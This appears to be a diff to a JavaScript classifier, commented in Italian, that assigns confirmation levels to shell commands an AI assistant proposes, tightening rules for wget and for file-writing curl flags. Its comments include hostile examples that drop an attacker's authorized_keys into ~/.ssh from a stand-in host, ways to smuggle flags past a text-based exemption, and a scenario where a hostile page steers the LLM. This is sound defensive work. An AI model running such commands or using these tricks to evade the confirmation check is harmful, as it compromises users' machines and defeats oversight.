@@ -48,14 +48,30 @@
 //     percorso): catturare un nome pericoloso travestito è sempre giusto,
 //     fidarsi di uno fidato travestito no.
 //   • flag pericolosi (--force, --hard, -rf…) alzano un livello ≤2 a 3.
-//   • curl/wget con un flag di output-su-file (-o/-O/--output/--remote-name…),
-//     wget con un flag di cartella di destinazione (-P/--directory-prefix) o curl
-//     con un dump degli header su file (-D/--dump-header) scrivono in un percorso
-//     arbitrario e possono sovrascrivere file sensibili (chiavi SSH, script
-//     d'avvio): salgono da 2 a 3. Stessa classe (scrittura in un percorso scelto
-//     di DATI ACCESSORI il cui contenuto è influenzato dal server) le opzioni più
-//     di nicchia di curl -c/--cookie-jar, --etag-save, --trace/--trace-ascii,
-//     --stderr e l'analoga wget --save-cookies: salgono anch'esse a 3.
+//   • SCARICARE DALLA RETE FACENDO ATTERRARE UN FILE SU DISCO è sempre livello 3
+//     (digita "conferma"). L'invariante è sull'EFFETTO, non sul nome del flag:
+//     wget scrive un file anche senza alcun flag di output, e la CARTELLA in cui
+//     lo scrive la sceglie l'assistente da sé con un `cd` (livello 1, nessuna
+//     conferma, persistente).
+//     Quindi WGET È SEMPRE 3, senza eccezioni: l'unica sua forma che davvero non
+//     fa atterrare niente (`--spider`) NON viene più esentata. Un'esenzione la si
+//     decide per forza leggendo il TESTO del comando, ma chi il comando lo compone
+//     può far comparire quella parola dove wget non la applica — dopo un `--`
+//     (`wget -N -- http://x --spider`: da lì in poi sono indirizzi), dentro le
+//     virgolette (`wget "http://x" " --spider "`), dentro l'URL stesso
+//     (`wget "http://x#  --spider "`) — e riavere lo scaricamento con un solo
+//     clic. Riconoscere "davvero un'opzione" richiederebbe di riprodurre il
+//     parsing di getopt e del quoting: fuori dal principio del file. Toglierla
+//     costa una conferma in più su un comando raro (per la sola verifica di un
+//     indirizzo c'è `curl -I`, che stampa a schermo e resta 2) e chiude la porta.
+//     curl invece, SENZA flag che scrivono, stampa a schermo e non fa atterrare
+//     niente: resta 2. Due programmi che si comportano diversamente prendono
+//     regole diverse — è l'effetto a decidere. Salgono a 3 i flag curl che fanno
+//     atterrare qualcosa: output-su-file (-o/-O/--output/--remote-name…), i DATI
+//     ACCESSORI il cui contenuto è influenzato dal server (-D/--dump-header,
+//     -c/--cookie-jar, --etag-save, --trace/--trace-ascii, --stderr, --libcurl,
+//     --hsts, --alt-svc, --metalink, `-w '%output{...}'`) e -K/--config, che nasconde
+//     l'output dentro un file di opzioni.
 
 (function (global) {
   'use strict';
@@ -308,7 +324,7 @@
   // `cp /mir file` (una cartella chiamata "mir"); solo robocopy usa questi flag.
   const ROBOCOPY_DESTRUCTIVE_RE = /(^|\s)\/(MIR|PURGE|MOVE|MOV)(\s|$)/i;
 
-  // curl/wget con un flag di OUTPUT-SU-FILE scrivono i byte scaricati in un
+  // curl con un flag di OUTPUT-SU-FILE scrive i byte scaricati in un
   // percorso scelto da chi lancia il comando (l'LLM, potenzialmente pilotato da
   // una pagina ostile): può SOVRASCRIVERE qualsiasi file — chiavi SSH
   // (~/.ssh/authorized_keys), script d'avvio della shell (~/.bashrc, ~/.profile)
@@ -320,28 +336,14 @@
   // server). Non tentiamo di distinguere il percorso "sensibile" da quello
   // innocuo: è inaffidabile (path relativi, ~, symlink, differenze OS) e un
   // falso negativo qui = il buco di sicurezza; l'over-cautela costa solo attrito.
-  // Check curl/wget-specifico (come GIT_DANGER_RE): un `-o` globale su `tar`/`zip`
+  // Check curl-specifico (come GIT_DANGER_RE): un `-o` globale su `tar`/`zip`
   // significherebbe altro. In un bundle di short-flag l'unico modo di avere una
-  // `o`/`O` è che sia il flag di output (curl -o/-O, wget -o=logfile/-O): gli
-  // altri short-flag di curl/wget non contengono `o`, quindi `-[a-z]*o` non ha
-  // falsi positivi qui. `-J`/--remote-header-name senza -O è inerte, e con -O è
-  // già coperto da -O: non serve intercettare la `j` (che confliggerebbe con
-  // curl -j = --junk-session-cookies, innocuo).
-  const CURL_WGET_OUTPUT_RE = /(^|\s)(--output|--remote-name|--remote-header-name|-[a-z]*o)/i;
-
-  // wget con `-P`/`--directory-prefix` sceglie la CARTELLA di destinazione e il
-  // nome del file arriva dall'URL (quindi dal server): `wget -P ~/.ssh http://
-  // evil/authorized_keys` scarica contenuto interamente scelto dall'attaccante
-  // dritto in ~/.ssh/authorized_keys. È la stessa backdoor di `-O`, solo scritta
-  // scegliendo la dir invece del file → deve salire a 3. Check wget-specifico:
-  // `-P` (uppercase) è, in wget, SOLO `--directory-prefix` (nessun altro
-  // short-flag wget usa la P maiuscola), quindi anche dentro un bundle
-  // (`-rP /dir`, `-P/dir` attaccato) l'unica lettura possibile è quella. La `P`
-  // è case-SENSITIVE apposta: `-p` = `--page-requisites` (scrive nella cwd, non
-  // arbitrario) e `-np` = `--no-parent` NON devono salire. `--directory-prefix`
-  // (doppio trattino) è gestito a parte: il ramo short a trattino singolo non lo
-  // intercetta.
-  const WGET_PREFIX_RE = /(^|\s)(--directory-prefix(=|\s|$)|-[a-zA-Z]*P)/;
+  // `o`/`O` è che sia il flag di output (curl -o/-O): gli altri short-flag di
+  // curl non contengono `o`, quindi `-[a-z]*o` non ha falsi positivi qui.
+  // `-J`/--remote-header-name senza -O è inerte, e con -O è già coperto da -O:
+  // non serve intercettare la `j` (che confliggerebbe con curl -j =
+  // --junk-session-cookies, innocuo). wget non passa di qui: è 3 comunque.
+  const CURL_OUTPUT_RE = /(^|\s)(--output|--remote-name|--remote-header-name|-[a-z]*o)/i;
 
   // curl con `-D`/`--dump-header <file>` scrive gli header della risposta in un
   // percorso arbitrario: il contenuto lo decide il server (quindi l'attaccante
@@ -357,7 +359,13 @@
   // il comando, con un contenuto comunque INFLUENZATO dal server (quindi da una
   // pagina ostile che pilota l'assistente): -c/--cookie-jar (i cookie del sito),
   // --etag-save (l'ETag della risposta), --trace/--trace-ascii (la traccia di
-  // debug della richiesta/risposta), --stderr (log/diagnostica di curl). Sono la
+  // debug della richiesta/risposta), --stderr (log/diagnostica di curl),
+  // --libcurl (il programma C equivalente, che contiene URL e header), --hsts e
+  // --alt-svc (le cache HSTS/Alt-Svc: curl le RILEGGE e le RISCRIVE con quanto
+  // dichiara il server, quindi creano/aggiornano il file indicato) e --metalink
+  // (tratta l'URL come un elenco XML di file da scaricare, coi nomi decisi
+  // dentro l'XML: disabilitato nelle build recenti, ma il classificatore non sa
+  // quale curl eseguirà il comando). Sono la
   // stessa classe logica di -D/--dump-header — scrittura-su-file arbitraria di
   // roba decisa dal remoto — solo più di nicchia e col contenuto più vincolato
   // (formato cookie netscape, ETag quotato, dump esadecimale): l'iniezione è meno
@@ -370,13 +378,28 @@
   // leggono un certificato, --trace-time/--trace-ids sono modificatori senza
   // file) NON combaciano: la parte long è ancorata con `(=|\s|$)` e il ramo short
   // matcha solo la `c` minuscola in un bundle a trattino singolo.
-  const CURL_ACCESSORY_WRITE_RE = /(^|\s)(--cookie-jar|--etag-save|--trace(-ascii)?|--stderr)(=|\s|$)|(^|\s)-[a-zA-Z]*c/;
+  const CURL_ACCESSORY_WRITE_RE = /(^|\s)(--cookie-jar|--etag-save|--trace(-ascii)?|--stderr|--libcurl|--hsts|--alt-svc|--metalink)(=|\s|$)|(^|\s)-[a-zA-Z]*c/;
 
-  // wget con `--save-cookies <file>` scrive i cookie del sito (contenuto
-  // influenzato dal server) in un percorso arbitrario: stessa classe di
-  // curl --cookie-jar → 3. `--load-cookies` (LEGGE i cookie) è innocuo e, essendo
-  // esplicito il nome, NON combacia.
-  const WGET_SAVE_COOKIES_RE = /(^|\s)--save-cookies(=|\s|$)/;
+  // curl `-w`/`--write-out` è un formato di stampa, ma dal 2023 (curl 8.3)
+  // conosce `%output{FILE}`: da lì in poi il testo formattato non va più a
+  // schermo, va NEL FILE indicato (`%output{>>FILE}` accoda). È un flag "di
+  // formato" che in realtà fa atterrare un file scelto da chi compone il comando
+  // → stessa classe di `-o` → 3. Cerchiamo la direttiva, non il flag: `-w` senza
+  // `%output{` stampa e basta (`curl -s -w '%{http_code}' <url>` resta 2), e la
+  // direttiva non può nascondersi spezzata in due token, perché `%output{` deve
+  // arrivare a curl dentro un unico argomento (e `unquote` ricompone le
+  // virgolette incollate dentro il token, vedi `dequote`).
+  const CURL_WRITE_OUT_FILE_RE = /%output\{/i;
+
+  // curl con `-K`/`--config <file>` LEGGE le opzioni da un file: dentro può
+  // esserci `output = /home/utente/.ssh/authorized_keys`, cioè lo stesso
+  // primitivo di scrittura di `-o` ma INVISIBILE nel testo del comando. L'effetto
+  // non è ispezionabile → vale il principio del file (ciò che non si riconosce è
+  // 3). Case-SENSITIVE sulla `K`: `-k`/`--insecure` (minuscolo, salta la verifica
+  // del certificato ma non scrive niente) NON deve salire; in curl la `K`
+  // maiuscola è solo `--config`, quindi anche in un bundle (`-sK cfg`) l'unica
+  // lettura possibile è quella.
+  const CURL_CONFIG_RE = /(^|\s)(--config(=|\s|$)|-[a-zA-Z]*K)/;
 
   // git: il livello dipende dal sotto-comando. I sotto-comandi "duali"
   // (tag, branch, config, remote) NON stanno qui: leggono da soli ma scrivono
@@ -685,20 +708,35 @@
     // Anche un comando LEVEL2 ridotto a `--version`/`--help` è sola lettura → 1.
     if (LEVEL2.has(prog)) {
       if (isVersionQuery(trimmed)) return 1;
-      // curl/wget che scrivono un file di output a un percorso arbitrario possono
+      // wget SCARICA SEMPRE SU FILE — è questa la differenza con curl, che senza
+      // `-o` stampa a schermo. Senza alcun flag di output `wget <url>` crea
+      // comunque un file nella cartella di lavoro, col nome deciso dall'URL
+      // (quindi dal server); e la cartella di lavoro la sceglie l'assistente da
+      // sé, perché `cd` è livello 1 (nessuna conferma) e la cwd è persistente tra
+      // i suoi comandi. Così `cd ~/.ssh && wget http://evil/authorized_keys` fa
+      // atterrare il file ESATTAMENTE dove lo faceva atterrare
+      // `wget -O ~/.ssh/authorized_keys`, che chiede di digitare "conferma".
+      // Stesso effetto → stesso livello, e NESSUNA eccezione: qualunque esenzione
+      // (perfino `--spider`, l'unica forma che non scarica) si deciderebbe
+      // leggendo il testo del comando, e chi lo compone può sempre far comparire
+      // la parola dove wget non la applica — dopo `--`, dentro le virgolette,
+      // dentro l'URL. Vedi il cappello del file.
+      if (prog === 'wget') return 3;
+      // curl che scrive un file di output a un percorso arbitrario può
       // sovrascrivere qualsiasi file (chiavi SSH, script d'avvio) → 3.
-      if ((prog === 'curl' || prog === 'wget') && CURL_WGET_OUTPUT_RE.test(trimmed)) return 3;
-      // wget -P/--directory-prefix: sceglie la dir, il nome file arriva dall'URL
-      // (server) → stessa scrittura arbitraria di -O → 3.
-      if (prog === 'wget' && WGET_PREFIX_RE.test(trimmed)) return 3;
+      if (prog === 'curl' && CURL_OUTPUT_RE.test(trimmed)) return 3;
       // curl -D/--dump-header: scrive gli header (contenuto del server) in un
       // percorso arbitrario → 3.
       if (prog === 'curl' && CURL_DUMP_RE.test(trimmed)) return 3;
-      // curl -c/--cookie-jar, --etag-save, --trace/--trace-ascii, --stderr:
-      // salvano dati accessori influenzati dal server in un percorso scelto → 3.
+      // curl -c/--cookie-jar, --etag-save, --trace/--trace-ascii, --stderr,
+      // --libcurl, --hsts, --alt-svc, --metalink: fanno atterrare su un percorso
+      // scelto dati influenzati dal server → 3.
       if (prog === 'curl' && CURL_ACCESSORY_WRITE_RE.test(trimmed)) return 3;
-      // wget --save-cookies: scrive i cookie del sito in un percorso scelto → 3.
-      if (prog === 'wget' && WGET_SAVE_COOKIES_RE.test(trimmed)) return 3;
+      // curl -w '%output{FILE}': il "formato di stampa" atterra su un file → 3.
+      if (prog === 'curl' && CURL_WRITE_OUT_FILE_RE.test(trimmed)) return 3;
+      // curl -K/--config: le opzioni (output compreso) arrivano da un file, quindi
+      // l'effetto non si legge nel comando → 3.
+      if (prog === 'curl' && CURL_CONFIG_RE.test(trimmed)) return 3;
       // robocopy /MIR /PURGE (cancellano la destinazione) / /MOVE /MOV
       // (cancellano la sorgente): distruzione permanente → 3.
       if (prog === 'robocopy' && ROBOCOPY_DESTRUCTIVE_RE.test(trimmed)) return 3;
